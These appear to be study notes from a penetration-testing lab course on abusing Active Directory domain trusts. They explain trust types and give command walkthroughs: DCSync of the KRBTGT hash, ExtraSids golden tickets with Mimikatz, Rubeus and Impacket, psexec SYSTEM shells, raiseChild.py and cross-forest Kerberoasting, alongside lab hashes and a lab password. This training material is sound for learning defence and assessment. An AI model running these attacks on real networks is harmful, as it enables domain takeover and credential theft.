\\\Domain Trusts Overview

A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:

    Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
    Cross-link: A trust between child domains to speed up authentication.
    External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
    Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
    Forest: A transitive trust between two forest root domains.
    ESAE: A bastion forest used to manage Active Directory.

When establishing a trust, certain elements can be modified depending on the business case.




Trusts can be transitive or non-transitive.

    A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
   
    In a non-transitive trust, the child domain itself is the only one trusted.


    
        \\\Trust Table Side By Side

    
    
        Transitive 	                                                                           
       
        Shared, 1 to many 	                                                                       
        The trust is shared with anyone in the forest 	                                            
        Forest, tree-root, parent-child, and cross-link trusts are transitive 	                    



        Non-Transitive

        Direct trust
        Not extended to next level child domains
        Typical for external or custom trust setups



        Trusts can be set up in two directions: one-way or two-way (bidirectional).

    One-way trust: Users in a trusted domain can access resources in a trusting domain, 
    not vice-versa.
    
    
    Bidirectional trust: Users from both trusting domains can access resources in the other domain. 
    For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, 
    users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and 
    vice-versa






            \\\\Enumerating Trust Relationships


    \\Using Get-ADTrust (bultin)

    PS C:\htb> Import-Module activedirectory
    PS C:\htb> Get-ADTrust -Filter *


    Aside from using built-in AD tools such as the Active Directory PowerShell module,
    both PowerView and BloodHound can be utilized to enumerate trust relationships,
    the type of trusts established, and the authentication flow. After importing PowerView,
    we can use the Get-DomainTrust function to enumerate what trusts exist, if any.


    
    \\\Checking for Existing Trusts using Get-DomainTrust

    PS C:\htb> Get-DomainTrust 



    \\Using Get-DomainTrustMapping

    PS C:\htb> Get-DomainTrustMapping


    \\\Checking Users in the Child Domain using Get-DomainUser

    PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

    Another tool we can use to get Domain Trust is netdom. The netdom query 
    sub-command of the netdom command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.


    \\Using netdom to query domain trust

    C:\htb> netdom query /domain:inlanefreight.local trust

    \\Using netdom to query domain controllers

    C:\htb> netdom query /domain:inlanefreight.local dc

    \\Using netdom to query workstations and servers

    C:\htb> netdom query /domain:inlanefreight.local workstation


    \\Visualizing Trust Relationships in BloodHound

    We can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here we can easily see that two bidirectional trusts exist.







     
                    \\\\Attacking Domain Trusts - Child -> Parent Trusts - from Windows


    

            \\\SID History Primer

        The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

        SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

        This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.


    
        \\ExtraSids Attack - Mimikatz

    This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

    To perform this attack after compromising a child domain, we need the following:

        The KRBTGT hash for the child domain
        The SID for the child domain
        The name of a target user in the child domain (does not need to exist!)
        The FQDN of the child domain.
        The SID of the Enterprise Admins group of the root domain.
        With this data collected, the attack can be performed with Mimikatz.



    Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.
    Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

    
    \\\Obtaining the KRBTGT Account's NT Hash using Mimikatz


    PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

    We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

    \\Using Get-DomainSID

    PS C:\htb> Get-DomainSID

    Next, we can use Get-DomainGroup from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the Get-ADGroup cmdlet with a command such as Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL".

    \\Obtaining Enterprise Admins Group's SID using Get-DomainGroup

    PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid


    At this point, we have gathered the following data points:

    The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
    The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
    The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker
    The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
    The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

    Before the attack, we can confirm no access to the file system of the DC in the parent domain.


    \\Using ls to Confirm No Access

    PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$


    Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.


    \\\Creating a Golden Ticket with Mimikatz

    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt


    \\Confirming a Kerberos Ticket is in Memory Using klist

    PS C:\htb> klist

    \\Listing the Entire C: Drive of the Domain Controller

    PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$






             \\\\ExtraSids Attack - Rubeus

    
    \\\Creating a Golden Ticket using Rubeus


    Next, we will formulate our Rubeus command using the data we retrieved above. The /rc4 flag is the NT hash for the KRBTGT account. The /sids flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.


    PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt



    Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the lab_adm Domain Admin user.


    \\Performing a DCSync Attack

    mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm


    When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

    mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL










                    \\\\Attacking Domain Trusts - Child -> Parent Trusts - from Linux




        We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

            The KRBTGT hash for the child domain
            The SID for the child domain
            The name of a target user in the child domain (does not need to exist!)
            The FQDN of the child domain
            The SID of the Enterprise Admins group of the root domain

        Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.


    
        \\\\Performing DCSync with secretsdump.py (aquire krbtgt)


    $ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt


    Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.


    \\\Performing SID Brute Forcing using lookupsid.py

    We can filter out the noise by piping the command output to grep and looking for just the domain SID.


    $ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"


    Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here (https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.

    \\\Grabbing the Domain SID & Attaching to Enterprise Admin's RID

    $ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"


    We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.

        The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
        The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
        The name of a target user in the child domain (does not need to exist!): hacker
        The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
        The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

    Next, we can use ticketer.py  from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).


    \\\Constructing a Golden Ticket using ticketer.py


    $ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker



    The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.


    \\Setting the KRB5CCNAME Environment Variable

    $ export KRB5CCNAME=hacker.ccache 

    We can check if we can successfully authenticate to the parent domain's Domain Controller using Impacket's version of Psexec. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

    \\Getting a SYSTEM shell using Impacket's psexec.py

    $ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5



    \\\\Performing the Attack with raiseChild.py



    Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

    Obtains the SID for the Enterprise Admins group of the parent domain
    Retrieves the hash for the KRBTGT account in the child domain
    Creates a Golden Ticket
    Logs into the parent domain
    Retrieves credentials for the Administrator account in the parent domain

    Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.


    $ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm







                    \\\\\Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows


    
        \\\Cross-Forest Kerberoasting


        Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

        We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.



        \\\Enumerating Accounts for Associated SPNs Using Get-DomainUser


        PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName


        We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.


        \\Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

        PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap



        \\\Admin Password Re-Use & Group Membership


        From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account or an account that is part of the Enterprise Admins or Domain Admins group in Domain A and Domain B has a highly privileged account with the same name. It is worth checking for password reuse across the two forests in this situation.

        We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

        We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.

        \\Using Get-DomainForeignGroupMember

        PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

                    GroupDomain             : FREIGHTLOGISTICS.LOCAL
            GroupName               : Administrators
            GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
            MemberDomain            : FREIGHTLOGISTICS.LOCAL
            MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
            MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                                    TICS,DC=LOCAL


        PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500



        The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.


        \\Accessing DC03 Using Enter-PSSession

        PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

        From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.



        \\\\SID History Abuse - Cross Forest


        SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. 






                    \\\\\Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux


        \\\Cross-Forest Kerberoasting  

        we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.


        \\\Using GetUserSPNs.py


        $ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley


        Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.

        $ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley


        If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. 


        Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned. 




        \\\Hunting Foreign Group Membership with Bloodhound-python


        As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound (https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.


        On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.

        \\\Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

        $ cat /etc/resolv.conf 

        Once this is in place, we can run the tool against the target domain as follows:

        \\Running bloodhound-python Against INLANEFREIGHT.LOCAL

        $ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

        We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.

        \\Compressing the File with zip -r

        $ zip -r ilfreight_bh.zip *.json


        \\Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

        The bloodhound-python command will look similar to the previous one:


        \\Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL


        $ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2


        After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

        